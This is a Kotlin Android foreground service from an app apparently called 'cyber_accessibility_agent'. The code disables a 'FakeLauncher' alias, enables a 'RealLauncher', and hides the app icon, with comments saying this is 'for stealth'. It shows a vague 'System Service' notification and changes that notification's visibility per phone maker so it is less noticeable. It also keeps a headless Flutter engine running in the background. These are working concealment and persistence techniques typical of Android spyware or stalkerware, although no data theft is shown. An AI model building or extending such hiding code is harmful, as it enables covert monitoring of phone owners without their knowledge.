// AgentService.kt - FINAL: Handles launcher switch and icon hiding after service starts
package com.example.cyber_accessibility_agent

import android.app.*
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.preference.PreferenceManager
import io.flutter.FlutterInjector
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.embedding.engine.dart.DartExecutor
import io.flutter.embedding.engine.loader.FlutterLoader
import io.flutter.plugin.common.MethodChannel
import java.util.concurrent.Executors

class AgentService : Service() {

    companion object {
        const val ACTION_START = "com.example.cyber_accessibility_agent.START_AGENT"
        private const val NOTIF_ID = 9991
        private const val CHANNEL_ID = "agent_service_channel"
        private const val TAG = "AgentService"
        
        // ✅ SharedPreferences key
        private const val PREF_LAUNCHER_SWITCHED = "launcher_switched"
    }

    private var flutterEngine: FlutterEngine? = null
    private val executor = Executors.newSingleThreadExecutor()

    override fun onCreate() {
        super.onCreate()
        
        AppLogger.logLifecycle("AgentService.onCreate")
        
        try {
            // ✅ STEP 1: Create notification channel and start foreground
            createNotificationChannel()
            startForeground(NOTIF_ID, buildNotification())
            AppLogger.i(TAG, "✅ Foreground service started successfully")
            
            // ✅ STEP 2: Switch launcher alias (disable fake, enable real)
            switchLauncherAliasIfNeeded()
            
            // ✅ STEP 3: Hide app icon for stealth
            hideAppIcon()
            
        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to start foreground service", e)
        }
    }

    /**
     * ✅ Switch from fake launcher to real launcher
     * Only runs once, guarded by SharedPreferences
     */
    private fun switchLauncherAliasIfNeeded() {
        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
        val alreadySwitched = prefs.getBoolean(PREF_LAUNCHER_SWITCHED, false)
        
        if (alreadySwitched) {
            AppLogger.d(TAG, "Launcher already switched - skipping")
            return
        }

        try {
            val pm = packageManager
            val packageName = packageName

            AppLogger.i(TAG, "Switching launcher alias...")

            // Disable fake launcher
            val fakeComponent = ComponentName(packageName, "$packageName.FakeLauncher")
            pm.setComponentEnabledSetting(
                fakeComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            AppLogger.i(TAG, "✅ FakeLauncher disabled")

            // Enable real launcher
            val realComponent = ComponentName(packageName, "$packageName.RealLauncher")
            pm.setComponentEnabledSetting(
                realComponent,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            AppLogger.i(TAG, "✅ RealLauncher enabled")

            // Mark as switched
            prefs.edit().putBoolean(PREF_LAUNCHER_SWITCHED, true).apply()
            AppLogger.i(TAG, "✅ Launcher alias switch complete")

        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to switch launcher alias", e)
        }
    }

    /**
     * ✅ Hide app icon using AppHider for stealth
     */
    private fun hideAppIcon() {
        try {
            AppLogger.i(TAG, "Hiding app icon...")
            
            val hidden = AppHider.hide(this)
            
            if (hidden) {
                AppLogger.i(TAG, "✅ App icon hidden successfully")
            } else {
                AppLogger.w(TAG, "App icon hide returned false (may already be hidden)")
            }
            
        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to hide app icon", e)
        }
    }

    override fun onStartCommand(intent: android.content.Intent?, flags: Int, startId: Int): Int {
        AppLogger.d(TAG, "onStartCommand: action=${intent?.action}")
        
        if (flutterEngine == null) {
            AppLogger.i(TAG, "Initializing Flutter engine...")
            executor.execute { initFlutter() }
        } else {
            AppLogger.d(TAG, "Flutter engine already initialized")
        }
        
        return START_STICKY
    }

    /**
     * ✅ Initialize headless Flutter engine for background tasks
     */
    private fun initFlutter() {
        AppLogger.d(TAG, "initFlutter() called")
        
        try {
            val loader = FlutterLoader()
            
            AppLogger.d(TAG, "Starting Flutter initialization...")
            loader.startInitialization(applicationContext)
            loader.ensureInitializationComplete(applicationContext, null)
            AppLogger.i(TAG, "Flutter loader initialized")

            val engine = FlutterEngine(applicationContext)
            
            AppLogger.d(TAG, "Executing Dart entrypoint: backgroundMain")
            val entrypoint = DartExecutor.DartEntrypoint(
                loader.findAppBundlePath(),
                "backgroundMain"
            )
            engine.dartExecutor.executeDartEntrypoint(entrypoint)

            MethodChannel(engine.dartExecutor.binaryMessenger, "agent/status")
                .setMethodCallHandler { call, result ->
                    when (call.method) {
                        "updateStatus" -> {
                            AppLogger.d(TAG, "Received updateStatus call")
                            result.success(true)
                        }
                        else -> result.notImplemented()
                    }
                }

            flutterEngine = engine
            AppLogger.i(TAG, "✅ Headless FlutterEngine started successfully")
            
        } catch (e: Exception) {
            AppLogger.e(TAG, "❌ Failed to start FlutterEngine", e)
        }
    }

    /**
     * ✅ Create notification channel for foreground service
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Background Service"
            val descriptionText = "Keeps the app running in background"
            val importance = NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                description = descriptionText
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
            
            AppLogger.d(TAG, "Notification channel created")
        }
    }

    /**
     * ✅ Build notification with OEM-specific tweaks for stealth
     */
    private fun buildNotification(): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setShowWhen(false)

        // ✅ OEM-specific tweaks for stealth
        val manufacturer = Build.MANUFACTURER.lowercase()
        
        when {
            // Tecno/Infinix/Itel: Use transparent notification
            manufacturer.contains("tecno") || 
            manufacturer.contains("infinix") || 
            manufacturer.contains("itel") -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_SECRET)
                AppLogger.d(TAG, "Using transparent notification for Tecno/Infinix/Itel")
            }
            
            // Samsung: Use private notification
            manufacturer.contains("samsung") -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_PRIVATE)
                AppLogger.d(TAG, "Using private notification for Samsung")
            }
            
            // Xiaomi/Redmi/Poco: Use private notification
            manufacturer.contains("xiaomi") || 
            manufacturer.contains("redmi") || 
            manufacturer.contains("poco") -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_PRIVATE)
                AppLogger.d(TAG, "Using private notification for Xiaomi/Redmi/Poco")
            }
            
            // Others: Public notification fallback
            else -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                AppLogger.d(TAG, "Using public notification (default)")
            }
        }
        
        return builder.build()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        AppLogger.logLifecycle("AgentService.onDestroy")
        
        try {
            flutterEngine?.destroy()
            flutterEngine = null
            AppLogger.i(TAG, "Flutter engine destroyed")
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error destroying Flutter engine", e)
        }
        
        executor.shutdownNow()
        super.onDestroy()
    }
}
